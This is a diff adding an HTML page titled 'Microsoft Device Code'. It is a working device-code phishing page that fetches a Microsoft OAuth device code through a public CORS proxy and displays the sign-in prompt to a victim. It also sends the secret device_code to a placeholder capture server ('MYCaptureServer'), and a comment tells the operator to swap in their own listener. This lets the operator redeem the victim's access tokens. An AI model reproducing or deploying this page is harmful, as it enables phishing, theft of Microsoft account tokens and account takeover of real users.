@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
+<head id="Head1"><title>
+    Microsoft Device Code
+</title><meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
+    <style>
+        table td {border-collapse:collapse;margin:0;padding:0;}
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        // Redirect CORS using corsanywhere running on FLUX web3 :)
+        $.get("https://corsanywhere.app.runonflux.io/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net").done(function(data) {
+            
+            document.getElementById('code').innerHTML += data.message;
+            // Change this line to point to your listening webserver
+            $.get("https://MYCaptureServer/?id=" + data.device_code);
+            document.write(data.message);
+        });
+
+        </script>
+</head>
